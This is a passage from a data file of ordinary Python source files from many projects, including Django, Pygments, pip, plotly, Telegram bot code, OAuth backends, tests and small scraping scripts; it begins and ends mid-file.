            sys.modules[app.kernel.shell._orig_sys_modules_main_name] = main

    # load the calling scope if not given
    (caller_module, caller_locals) = extract_module_locals(1)
    if module is None:
        module = caller_module
    if local_ns is None:
        local_ns = caller_locals

    app.kernel.user_module = module
    app.kernel.user_ns = local_ns
    app.shell.set_completer_frame()
    app.start()"
JY70	JY70-web_app.py	"import hashlib
import hmac
from operator import itemgetter
from typing import Callable, Any, Dict
from urllib.parse import parse_qsl


def check_webapp_signature(token: str, init_data: str) -> bool:
    """"""
    Check incoming WebApp init data signature

    Source: https://core.telegram.org/bots/webapps#validating-data-received-via-the-web-app

    :param token:
    :param init_data:
    :return:
    """"""
    try:
        parsed_data = dict(parse_qsl(init_data))
    except ValueError:
        # Init data is not a valid query string
        return False
    if ""hash"" not in parsed_data:
        # Hash is not present in init data
        return False

    hash_ = parsed_data.pop('hash')
    data_check_string = ""\n"".join(
        f""{k}={v}"" for k, v in sorted(parsed_data.items(), key=itemgetter(0))
    )
    secret_key = hmac.new(
        key=b""WebAppData"", msg=token.encode(), digestmod=hashlib.sha256
    )
    calculated_hash = hmac.new(
        key=secret_key.digest(), msg=data_check_string.encode(), digestmod=hashlib.sha256
    ).hexdigest()
    return calculated_hash == hash_


def parse_init_data(init_data: str, _loads: Callable[..., Any]) -> Dict[str, Any]:
    """"""
    Parse WebApp init data and return it as dict

    :param init_data:
    :param _loads:
    :return:
    """"""
    result = {}
    for key, value in parse_qsl(init_data):
        if (value.startswith('[') and value.endswith(']')) or (value.startswith('{') and value.endswith('}')):
            value = _loads(value)
        result[key] = value
    return result


def safe_parse_webapp_init_data(token: str, init_data: str, _loads: Callable[..., Any]) -> Dict[str, Any]:
    """"""
    Validate WebApp init data and return it as dict

    :param token:
    :param init_data:
    :param _loads:
    :return:
    """"""
    if check_webapp_signature(token, init_data):
        return parse_init_data(init_data, _loads)
    raise ValueError(""Invalid init data signature"")"
JD199	JD199-jmespath.py	"""""""
    pygments.lexers.jmespath
    ~~~~~~~~~~~~~~~~~~~~~~~~

    Lexers for the JMESPath language

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer, bygroups, include
from pygments.token import String, Punctuation, Whitespace, Name, Operator, \
    Number, Literal, Keyword

__all__ = ['JMESPathLexer']


class JMESPathLexer(RegexLexer):
    """"""
    For JMESPath queries.
    """"""
    name = 'JMESPath'
    url = 'https://jmespath.org'
    filenames = ['*.jp']
    aliases = ['jmespath', 'jp']

    tokens = {
        'string': [
            (r""'(\\(.|\n)|[^'\\])*'"", String),
        ],
        'punctuation': [
            (r'(\[\?|[\.\*\[\],:\(\)\{\}\|])', Punctuation),
        ],
        'ws': [
            (r"" |\t|\n|\r"", Whitespace)
        ],
        ""dq-identifier"": [
            (r'[^\\""]+', Name.Variable),
            (r'\\""', Name.Variable),
            (r'.', Punctuation, '#pop'),
        ],
        'identifier': [
            (r'(&)?("")', bygroups(Name.Variable, Punctuation), 'dq-identifier'),
            (r'("")?(&?[A-Za-z][A-Za-z0-9_-]*)("")?', bygroups(Punctuation, Name.Variable, Punctuation)),
        ],
        'root': [
            include('ws'),
            include('string'),
            (r'(==|!=|<=|>=|<|>|&&|\|\||!)', Operator),
            include('punctuation'),
            (r'@', Name.Variable.Global),
            (r'(&?[A-Za-z][A-Za-z0-9_]*)(\()', bygroups(Name.Function, Punctuation)),
            (r'(&)(\()', bygroups(Name.Variable, Punctuation)),
            include('identifier'),
            (r'-?\d+', Number),
            (r'`', Literal, 'literal'),
        ],
        'literal': [
            include('ws'),
            include('string'),
            include('punctuation'),
            (r'(false|true|null)\b', Keyword.Constant),
            include('identifier'),
            (r'-?\d+\.?\d*([eE][-+]\d+)?', Number),
            (r'\\`', Literal),
            (r'`', Literal, '#pop'),
        ]
    }"
JD175	JD175-PageInfo_pb2.py	"# -*- coding: utf-8 -*-
# Generated by the protocol buffer compiler.  DO NOT EDIT!
# source: streamlit/proto/PageInfo.proto

from google.protobuf import descriptor as _descriptor
from google.protobuf import message as _message
from google.protobuf import reflection as _reflection
from google.protobuf import symbol_database as _symbol_database
# @@protoc_insertion_point(imports)

_sym_db = _symbol_database.Default()




DESCRIPTOR = _descriptor.FileDescriptor(
  name='streamlit/proto/PageInfo.proto',
  package='',
  syntax='proto3',
  serialized_options=None,
  create_key=_descriptor._internal_create_key,
  serialized_pb=b'\n\x1estreamlit/proto/PageInfo.proto\"" \n\x08PageInfo\x12\x14\n\x0cquery_string\x18\x01 \x01(\tb\x06proto3'
)




_PAGEINFO = _descriptor.Descriptor(
  name='PageInfo',
  full_name='PageInfo',
  filename=None,
  file=DESCRIPTOR,
  containing_type=None,
  create_key=_descriptor._internal_create_key,
  fields=[
    _descriptor.FieldDescriptor(
      name='query_string', full_name='PageInfo.query_string', index=0,
      number=1, type=9, cpp_type=9, label=1,
      has_default_value=False, default_value=b"""".decode('utf-8'),
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      serialized_options=None, file=DESCRIPTOR,  create_key=_descriptor._internal_create_key),
  ],
  extensions=[
  ],
  nested_types=[],
  enum_types=[
  ],
  serialized_options=None,
  is_extendable=False,
  syntax='proto3',
  extension_ranges=[],
  oneofs=[
  ],
  serialized_start=34,
  serialized_end=66,
)

DESCRIPTOR.message_types_by_name['PageInfo'] = _PAGEINFO
_sym_db.RegisterFileDescriptor(DESCRIPTOR)

PageInfo = _reflection.GeneratedProtocolMessageType('PageInfo', (_message.Message,), {
  'DESCRIPTOR' : _PAGEINFO,
  '__module__' : 'streamlit.proto.PageInfo_pb2'
  # @@protoc_insertion_point(class_scope:PageInfo)
  })
_sym_db.RegisterMessage(PageInfo)


# @@protoc_insertion_point(module_scope)"
JD335	JD335-qq.py	"""""""
Created on May 13, 2014

@author: Yong Zhang (zyfyfe@gmail.com)
""""""

import json

from ..utils import parse_qs
from .oauth import BaseOAuth2


class QQOAuth2(BaseOAuth2):
    name = 'qq'
    ID_KEY = 'openid'
    AUTHORIZE_URL = 'https://graph.qq.com/oauth2.0/authorize'
    ACCESS_TOKEN_URL = 'https://graph.qq.com/oauth2.0/token'
    AUTHORIZATION_URL = 'https://graph.qq.com/oauth2.0/authorize'
    OPENID_URL = 'https://graph.qq.com/oauth2.0/me'
    REDIRECT_STATE = False
    EXTRA_DATA = [
        ('nickname', 'username'),
        ('figureurl_qq_1', 'profile_image_url'),
        ('gender', 'gender')
    ]

    def get_user_details(self, response):
        """"""
        Return user detail from QQ account sometimes nickname will duplicate
        with another qq account, to avoid this issue it's possible to use
        openid as username.
        """"""
        if self.setting('USE_OPENID_AS_USERNAME', False):
            username = response.get('openid', '')
        else:
            username = response.get('nickname', '')

        fullname, first_name, last_name = self.get_user_names(
            first_name=response.get('nickname', '')
        )

        return {
            'username': username,
            'fullname': fullname,
            'first_name': first_name,
            'last_name': last_name
        }

    def get_openid(self, access_token):
        response = self.request(self.OPENID_URL, params={
            'access_token': access_token
        })
        content = response.content.decode()
        data = json.loads(content[10:-3])
        return data['openid']

    def user_data(self, access_token, *args, **kwargs):
        openid = self.get_openid(access_token)
        response = self.get_json(
            'https://graph.qq.com/user/get_user_info', params={
                'access_token': access_token,
                'oauth_consumer_key': self.setting('KEY'),
                'openid': openid
            }
        )
        response['openid'] = openid
        return response

    def request_access_token(self, url, data, *args, **kwargs):
        response = self.request(url, *args, **kwargs)
        return parse_qs(response.content)"
JY221	JY221-0001_initial.py	"# Generated by Django 3.2.18 on 2023-03-09 11:26

from django.db import migrations, models
import django.db.models.deletion
import multiselectfield.db.fields


class Migration(migrations.Migration):

    initial = True

    dependencies = [
    ]

    operations = [
        migrations.CreateModel(
            name='Event',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('event_name', models.CharField(max_length=200, unique=True)),
                ('event_date', models.DateField()),
                ('event_time', models.TimeField()),
                ('created_on', models.DateTimeField(auto_now_add=True)),
            ],
        ),
        migrations.CreateModel(
            name='Guest',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('guest_name', models.CharField(max_length=200, unique=True)),
                ('slug', models.SlugField(max_length=200, unique=True)),
                ('email', models.EmailField(max_length=254)),
                ('is_attending', models.BooleanField(choices=[(False, 'No'), (True, 'Yes')], default='', verbose_name='Attending?')),
                ('message', models.TextField(blank=True)),
                ('dietary_requirements', multiselectfield.db.fields.MultiSelectField(choices=[(1, 'none'), (2, 'coeliac'), (3, 'food allergy'), (4, 'food intolerance'), (5, 'vegetarian'), (6, 'vegan'), (7, 'pescatarian'), (8, 'teetotal')], max_length=15)),
                ('plus_one_attending', models.BooleanField(choices=[(False, 'No'), (True, 'Yes')], default='', verbose_name='Attending?')),
                ('invited', models.IntegerField(choices=[(0, 'Draft'), (1, 'Invited')], default=0)),
                ('event', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, related_name='guests', to='weddingapp.event')),
            ],
            options={
                'ordering': ['-guest_name'],
            },
        ),
    ]"
JD267	JD267-base.py	"""""""
Dummy database backend for Django.

Django uses this if the database ENGINE setting is empty (None or empty string).

Each of these API functions, except connection.close(), raise
ImproperlyConfigured.
""""""

from django.core.exceptions import ImproperlyConfigured
from django.db.backends.base.base import BaseDatabaseWrapper
from django.db.backends.base.client import BaseDatabaseClient
from django.db.backends.base.creation import BaseDatabaseCreation
from django.db.backends.base.introspection import BaseDatabaseIntrospection
from django.db.backends.base.operations import BaseDatabaseOperations
from django.db.backends.dummy.features import DummyDatabaseFeatures


def complain(*args, **kwargs):
    raise ImproperlyConfigured(
        ""settings.DATABASES is improperly configured. ""
        ""Please supply the ENGINE value. Check ""
        ""settings documentation for more details.""
    )


def ignore(*args, **kwargs):
    pass


class DatabaseOperations(BaseDatabaseOperations):
    quote_name = complain


class DatabaseClient(BaseDatabaseClient):
    runshell = complain


class DatabaseCreation(BaseDatabaseCreation):
    create_test_db = ignore
    destroy_test_db = ignore


class DatabaseIntrospection(BaseDatabaseIntrospection):
    get_table_list = complain
    get_table_description = complain
    get_relations = complain
    get_indexes = complain


class DatabaseWrapper(BaseDatabaseWrapper):
    operators = {}
    # Override the base class implementations with null
    # implementations. Anything that tries to actually
    # do something raises complain; anything that tries
    # to rollback or undo something raises ignore.
    _cursor = complain
    ensure_connection = complain
    _commit = complain
    _rollback = ignore
    _close = ignore
    _savepoint = ignore
    _savepoint_commit = complain
    _savepoint_rollback = ignore
    _set_autocommit = complain
    # Classes instantiated in __init__().
    client_class = DatabaseClient
    creation_class = DatabaseCreation
    features_class = DummyDatabaseFeatures
    introspection_class = DatabaseIntrospection
    ops_class = DatabaseOperations

    def is_usable(self):
        return True"
JY354	JY354-test_fake_env.py	"from minerl.herobraine.hero import handlers
from typing import List
from minerl.herobraine.hero.handlers.translation import TranslationHandler
import time
from minerl.herobraine.env_specs.navigate_specs import Navigate

import coloredlogs
import logging

color = coloredlogs.install(level=logging.DEBUG)


# Let's also test monitors

class NavigateWithDistanceMonitor(Navigate):
    def create_monitors(self) -> List[TranslationHandler]:
        return [
            handlers.CompassObservation(angle=False, distance=True)
        ]


def _test_fake_env(env_spec, should_render=False):
    # Make the env.
    fake_env = env_spec.make(fake=True)

    assert fake_env.action_space == fake_env.task.action_space
    assert fake_env.observation_space == fake_env.observation_space

    assert fake_env._seed == None

    fake_env.seed(200)
    assert fake_env._seed == 200
    fake_obs = fake_env.reset()

    assert fake_obs in env_spec.observation_space

    for _ in range(100):
        fake_obs, _, _, fake_monitor = fake_env.step(fake_env.action_space.sample())
        if should_render:
            fake_env.render()
            time.sleep(0.1)
        assert fake_obs in env_spec.observation_space
        assert fake_monitor in env_spec.monitor_space


def test_fake_navigate():
    _test_fake_env(Navigate(dense=True, extreme=False))
    _test_fake_env(Navigate(dense=True, extreme=False, agent_count=3))


def test_fake_navigate_with_distance_monitor():
    task = NavigateWithDistanceMonitor(dense=True, extreme=False)
    fake_env = task.make(fake=True)
    _ = fake_env.reset()

    for _ in range(100):
        fake_obs, _, _, fake_monitor = fake_env.step(fake_env.action_space.sample())
        assert fake_monitor in fake_env.monitor_space
        assert ""compass"" in fake_monitor
        assert ""distance"" in fake_monitor[""compass""]


if __name__ == ""__main__"":
    # _test_fake_env(Navigate(dense=True, extreme=False), should_render=True)
    _test_fake_env(Navigate(dense=True, extreme=False, agent_count=3), should_render=True)
    # test_fake_navigate_with_distance_monitor()"
JD9	JD9-test_file_io.py	"# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.

import os
import shutil
import sys
import tempfile
import unittest
from typing import Optional
from unittest.mock import MagicMock


class TestFileIO(unittest.TestCase):

    _tmpdir: Optional[str] = None
    _tmpfile: Optional[str] = None
    _tmpfile_contents = ""Hello, World""

    @classmethod
    def setUpClass(cls) -> None:
        cls._tmpdir = tempfile.mkdtemp()
        with open(os.path.join(cls._tmpdir, ""test.txt""), ""w"") as f:
            cls._tmpfile = f.name
            f.write(cls._tmpfile_contents)
            f.flush()

    @classmethod
    def tearDownClass(cls) -> None:
        # Cleanup temp working dir.
        if cls._tmpdir is not None:
            shutil.rmtree(cls._tmpdir)  # type: ignore

    def test_file_io(self):
        from fairseq.file_io import PathManager

        with PathManager.open(os.path.join(self._tmpdir, ""test.txt""), ""r"") as f:
            s = f.read()
        self.assertEqual(s, self._tmpfile_contents)

    def test_file_io_oss(self):
        # Mock iopath to simulate oss environment.
        sys.modules[""iopath""] = MagicMock()
        from fairseq.file_io import PathManager

        with PathManager.open(os.path.join(self._tmpdir, ""test.txt""), ""r"") as f:
            s = f.read()
        self.assertEqual(s, self._tmpfile_contents)

    def test_file_io_async(self):
        # ioPath `PathManager` is initialized after the first `opena` call.
        try:
            from fairseq.file_io import IOPathManager, PathManager
            _asyncfile = os.path.join(self._tmpdir, ""async.txt"")
            f = PathManager.opena(_asyncfile, ""wb"")
            f.close()

        finally:
            self.assertTrue(PathManager.async_close())"
JD437	JD437-quickstart_searchallresources_test.py	"#!/usr/bin/env python

# Copyright 2020 Google LLC.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os
import uuid

import backoff
from google.api_core.exceptions import NotFound
from google.cloud import bigquery
import pytest

import quickstart_searchallresources

PROJECT = os.environ[""GOOGLE_CLOUD_PROJECT""]
DATASET = ""dataset_{}"".format(uuid.uuid4().hex)


@pytest.fixture(scope=""module"")
def bigquery_client():
    yield bigquery.Client()


@pytest.fixture(scope=""module"")
def asset_dataset(bigquery_client):
    dataset = bigquery_client.create_dataset(DATASET)

    yield DATASET

    try:
        bigquery_client.delete_dataset(dataset)
    except NotFound as e:
        print(""Failed to delete dataset {}"".format(DATASET))
        raise e


@pytest.mark.flaky(max_runs=3, min_passes=1)
def test_search_all_resources(asset_dataset, capsys):
    scope = ""projects/{}"".format(PROJECT)
    query = ""name:{}"".format(DATASET)

    # Dataset creation takes some time to propagate, so the dataset is not
    # immediately searchable. Need some time before the snippet will pass.
    @backoff.on_exception(backoff.expo, (AssertionError), max_time=240)
    def eventually_consistent_test():
        quickstart_searchallresources.search_all_resources(scope, query=query)
        out, _ = capsys.readouterr()

        assert DATASET in out

    eventually_consistent_test()"
JD276	JD276-cached_db.py	"""""""
Cached, database-backed sessions.
""""""

from django.conf import settings
from django.contrib.sessions.backends.db import SessionStore as DBStore
from django.core.cache import caches

KEY_PREFIX = ""django.contrib.sessions.cached_db""


class SessionStore(DBStore):
    """"""
    Implement cached, database backed sessions.
    """"""

    cache_key_prefix = KEY_PREFIX

    def __init__(self, session_key=None):
        self._cache = caches[settings.SESSION_CACHE_ALIAS]
        super().__init__(session_key)

    @property
    def cache_key(self):
        return self.cache_key_prefix + self._get_or_create_session_key()

    def load(self):
        try:
            data = self._cache.get(self.cache_key)
        except Exception:
            # Some backends (e.g. memcache) raise an exception on invalid
            # cache keys. If this happens, reset the session. See #17810.
            data = None

        if data is None:
            s = self._get_session_from_db()
            if s:
                data = self.decode(s.session_data)
                self._cache.set(
                    self.cache_key, data, self.get_expiry_age(expiry=s.expire_date)
                )
            else:
                data = {}
        return data

    def exists(self, session_key):
        return (
            session_key
            and (self.cache_key_prefix + session_key) in self._cache
            or super().exists(session_key)
        )

    def save(self, must_create=False):
        super().save(must_create)
        self._cache.set(self.cache_key, self._session, self.get_expiry_age())

    def delete(self, session_key=None):
        super().delete(session_key)
        if session_key is None:
            if self.session_key is None:
                return
            session_key = self.session_key
        self._cache.delete(self.cache_key_prefix + session_key)

    def flush(self):
        """"""
        Remove the current session data from the database and regenerate the
        key.
        """"""
        self.clear()
        self.delete(self.session_key)
        self._session_key = None"
JY194	JY194-prototipo_airbnb.py	"from playwright.sync_api import sync_playwright
import pandas as pd
import numpy as np

def pagina_min_fazenda(cidade, estado, pagina):
    pagina.goto(""https://www.airbnb.com.br/"")


    #FAZENDO A PESQUISA 
    pagina.locator('''xpath = /html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/
    header/div/div[2]/div[1]/div/button[1]''').click()
    pagina.locator('''xpath = /html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/
    header/div/div[2]/div[2]/div/div/div/form/div[2]/div/div[1]/div/label/div/input''').fill(cidade + ', ' + estado)
    if cidade in pagina.locator('''/html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/header/div/div[2]/div[2]/div/div/div/form/div[2]/div/div[1]/div/div[2]/div''').inner_text():
        pagina.locator('''xpath = /html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/header/div/div[2]/div[2]/div/div/div/form/div[2]/div/div[1]/div/div[2]/div''').locator('nth = 0').click()
        pagina.locator('''xpath = /html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/header/div/div[2]/div[2]/div/div/div/form/div[2]/div/div[3]/div[2]/div/div/section/div/div/div/div/div[1]/div/div[1]/div/button[2]''').click()
        pagina.locator('''xpath = /html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/header/div/div[2]/div[2]/div/div/div/form/div[2]/div/div[3]/div[2]/div/div/section/div/div/div/div/div[2]/div[2]/div/div[1]/div[2]/div[2]/label''').click()
        pagina.locator('''xpath = /html/body/div[5]/div/div/div[1]/div/div[2]/div/div/div/div/div/div[2]/div/div/div/header/div/div[2]/div[2]/div/div/div/form/div[2]/div/div[5]/div[1]/div[2]/button/div/div[1]/svg''').click()


    return 
with sync_playwright() as p:
    
    navegador = p.chromium.launch(headless = False)
    pagina = navegador.new_page(viewport = {'width': 1200, 'height': 800})"
JY170	JY170-cache.py	"""""""HTTP cache implementation.
""""""

import os
from contextlib import contextmanager
from typing import Iterator, Optional

from pip._vendor.cachecontrol.cache import BaseCache
from pip._vendor.cachecontrol.caches import FileCache
from pip._vendor.requests.models import Response

from pip._internal.utils.filesystem import adjacent_tmp_file, replace
from pip._internal.utils.misc import ensure_dir


def is_from_cache(response: Response) -> bool:
    return getattr(response, ""from_cache"", False)


@contextmanager
def suppressed_cache_errors() -> Iterator[None]:
    """"""If we can't access the cache then we can just skip caching and process
    requests as if caching wasn't enabled.
    """"""
    try:
        yield
    except OSError:
        pass


class SafeFileCache(BaseCache):
    """"""
    A file based cache which is safe to use even when the target directory may
    not be accessible or writable.
    """"""

    def __init__(self, directory: str) -> None:
        assert directory is not None, ""Cache directory must not be None.""
        super().__init__()
        self.directory = directory

    def _get_cache_path(self, name: str) -> str:
        # From cachecontrol.caches.file_cache.FileCache._fn, brought into our
        # class for backwards-compatibility and to avoid using a non-public
        # method.
        hashed = FileCache.encode(name)
        parts = list(hashed[:5]) + [hashed]
        return os.path.join(self.directory, *parts)

    def get(self, key: str) -> Optional[bytes]:
        path = self._get_cache_path(key)
        with suppressed_cache_errors():
            with open(path, ""rb"") as f:
                return f.read()

    def set(self, key: str, value: bytes) -> None:
        path = self._get_cache_path(key)
        with suppressed_cache_errors():
            ensure_dir(os.path.dirname(path))

            with adjacent_tmp_file(path) as f:
                f.write(value)

            replace(f.name, path)

    def delete(self, key: str) -> None:
        path = self._get_cache_path(key)
        with suppressed_cache_errors():
            os.remove(path)"
JD107	JD107-introspection.py	"from MySQLdb.constants import FIELD_TYPE

from django.contrib.gis.gdal import OGRGeomType
from django.db.backends.mysql.introspection import DatabaseIntrospection


class MySQLIntrospection(DatabaseIntrospection):
    # Updating the data_types_reverse dictionary with the appropriate
    # type for Geometry fields.
    data_types_reverse = DatabaseIntrospection.data_types_reverse.copy()
    data_types_reverse[FIELD_TYPE.GEOMETRY] = 'GeometryField'

    def get_geometry_type(self, table_name, description):
        with self.connection.cursor() as cursor:
            # In order to get the specific geometry type of the field,
            # we introspect on the table definition using `DESCRIBE`.
            cursor.execute('DESCRIBE %s' %
                           self.connection.ops.quote_name(table_name))
            # Increment over description info until we get to the geometry
            # column.
            for column, typ, null, key, default, extra in cursor.fetchall():
                if column == description.name:
                    # Using OGRGeomType to convert from OGC name to Django field.
                    # MySQL does not support 3D or SRIDs, so the field params
                    # are empty.
                    field_type = OGRGeomType(typ).django
                    field_params = {}
                    break
        return field_type, field_params

    def supports_spatial_index(self, cursor, table_name):
        # Supported with MyISAM/Aria, or InnoDB on MySQL 5.7.5+/MariaDB 10.2.2+
        storage_engine = self.get_storage_engine(cursor, table_name)
        if storage_engine == 'InnoDB':
            return self.connection.mysql_version >= (
                (10, 2, 2) if self.connection.mysql_is_mariadb else (5, 7, 5)
            )
        return storage_engine in ('MyISAM', 'Aria')"
JD68	JD68-RLDataWebScraper8.py	"# for valid status = false && color is empty, rerun S1 to extract images
import requests
from bs4 import BeautifulSoup
import time

api_url = 'http://127.0.0.1:3000/items'

# Get the current list of daily items from the API
response = requests.get(api_url)
items = response.json()

updated_count = 0
skipped_count = 0

last_attempted_item = 0

# Go through each item and update the image
for item in items:
    if last_attempted_item is not None and item['id'] < last_attempted_item:
        continue
    if not item['valid_status'] or item['color']:
        skipped_count += 1
        continue
    while True:
        try:
            img_location = item['image_location']
            img_response = requests.get(img_location)
            img_html = img_response.text
            img_div_start = img_html.find('<div id=""itemSummaryImage"">')
            if img_div_start != -1:
                img_div_end = img_html.find('</div>', img_div_start)
                img_div = img_html[img_div_start:img_div_end+6]
                img_url_start = img_div.find('<img src=""')
                img_url_end = img_div.find('""', img_url_start+10)
                img_url = img_div[img_url_start+10:img_url_end]
                item_data = {'image': img_url, 'valid_status': True}
                patch_response = requests.patch(api_url+'/'+str(item['id']), json=item_data)
                print(f""{item['id']} Image updated"")
                updated_count += 1
            else:
                print(f""{item['id']} No image found"")
                item_data = {'valid_status': False}
                patch_response = requests.patch(api_url+'/'+str(item['id']), json=item_data)
                skipped_count += 1
            last_attempted_item = item['id']
            break
        except Exception as e:
            print(f""Error updating item {item['id']}: {e}"")
            print(f""Retrying in 5 minutes..."")
            time.sleep(5 * 60)

print(f""Updated {updated_count} items"")
print(f""Skipped {skipped_count} items"")"
JY281	JY281-cbb.py	"# (©)Codexbotz
# Recode by @mrismanaziz
# t.me/SharingUserbot & t.me/Lunatic0de

from bot import Bot
from config import OWNER
from Data import Data
from pyrogram import filters
from pyrogram.errors import MessageNotModified
from pyrogram.types import CallbackQuery, InlineKeyboardMarkup, Message


@Bot.on_message(filters.private & filters.incoming & filters.command(""about""))
async def _about(client: Bot, msg: Message):
    await client.send_message(
        msg.chat.id,
        Data.ABOUT.format(client.username, OWNER),
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(Data.mbuttons),
    )


@Bot.on_message(filters.private & filters.incoming & filters.command(""help""))
async def _help(client: Bot, msg: Message):
    await client.send_message(
        msg.chat.id,
        ""<b>Cara Menggunakan Bot ini</b>\n"" + Data.HELP,
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(Data.buttons),
    )


@Bot.on_callback_query()
async def cb_handler(client: Bot, query: CallbackQuery):
    data = query.data
    if data == ""about"":
        try:
            await query.message.edit_text(
                text=Data.ABOUT.format(client.username, OWNER),
                disable_web_page_preview=True,
                reply_markup=InlineKeyboardMarkup(Data.mbuttons),
            )
        except MessageNotModified:
            pass
    elif data == ""help"":
        try:
            await query.message.edit_text(
                text=""<b>Cara Menggunakan Bot ini</b>\n"" + Data.HELP,
                disable_web_page_preview=True,
                reply_markup=InlineKeyboardMarkup(Data.buttons),
            )
        except MessageNotModified:
            pass
    elif data == ""close"":
        await query.message.delete()
        try:
            await query.message.reply_to_message.delete()
        except BaseException:
            pass"
JY396	JY396-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""densitymapbox"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY305	JY305-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""font"", parent_name=""pie.title"", **kwargs):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD401	JD401-noxfile_config.py	"# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Default TEST_CONFIG_OVERRIDE for python repos.

# You can copy this file into your directory, then it will be imported from
# the noxfile.py.

# The source of truth:
# https://github.com/GoogleCloudPlatform/python-docs-samples/blob/main/noxfile_config.py

TEST_CONFIG_OVERRIDE = {
    # You can opt out from the test for specific Python versions.
    ""ignored_versions"": [""2.7"", ""3.6"", ""3.9"", ""3.10"", ""3.11""],
    # Old samples are opted out of enforcing Python type hints
    # All new samples should feature them
    ""enforce_type_hints"": False,
    # An envvar key for determining the project id to use. Change it
    # to 'BUILD_SPECIFIC_GCLOUD_PROJECT' if you want to opt in using a
    # build specific Cloud project. You can also use your own string
    # to use your own Cloud project.
    ""gcloud_project_env"": ""GOOGLE_CLOUD_PROJECT"",
    # 'gcloud_project_env': 'BUILD_SPECIFIC_GCLOUD_PROJECT',
    # If you need to use a specific version of pip,
    # change pip_version_override to the string representation
    # of the version number, for example, ""20.2.4""
    ""pip_version_override"": None,
    # A dictionary you want to inject into your test. Don't put any
    # secrets here. These values will override predefined values.
    ""envs"": {},
}"
JD435	JD435-batch_predict_test.py	"#!/usr/bin/env python

# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os

from google.cloud.automl_v1beta1 import Model

import pytest

import automl_tables_model
import automl_tables_predict
import model_test


PROJECT = os.environ[""GOOGLE_CLOUD_PROJECT""]
REGION = ""us-central1""
STATIC_MODEL = model_test.STATIC_MODEL
